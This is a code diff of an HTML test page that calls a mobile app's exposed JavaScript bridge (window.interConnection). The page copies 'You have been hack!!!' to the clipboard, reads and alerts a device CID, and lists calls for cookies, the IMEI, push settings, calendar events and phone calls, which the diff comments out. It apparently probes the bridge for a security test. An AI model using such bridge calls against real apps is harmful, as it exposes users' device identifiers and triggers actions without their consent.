@@ -19,9 +19,13 @@
             window.interConnection.copy("You have been hack!!!");
         }
 
-        function getCID() {
-            var result = window.interConnection.getCID();
+        function toGetCID() {
+            window.interConnection.getCID();
+        }
+
+        function getCID(result) {
             document.getElementById("content").innerText = "getCID:\n" + result;
+            alert(result);
             // document.getElementById("content").innerHTML = result;
         }
 
@@ -100,14 +104,15 @@
         }
 
         //         setInterval(gotoWhiteUrl,5);//5毫秒
-        copy();
+//         copy();
+        toGetCID();
         getCID();
-        getCookie();
-        getIMEI();
-        showPicturesWithUrl();
-        turnOffPush();
-        insertCalendarEvent();
-        zCircleModePhoneCall();
+//         getCookie();
+//         getIMEI();
+//         showPicturesWithUrl();
+//         turnOffPush();
+//         insertCalendarEvent();
+//         zCircleModePhoneCall();
     </script>
 </body>
 
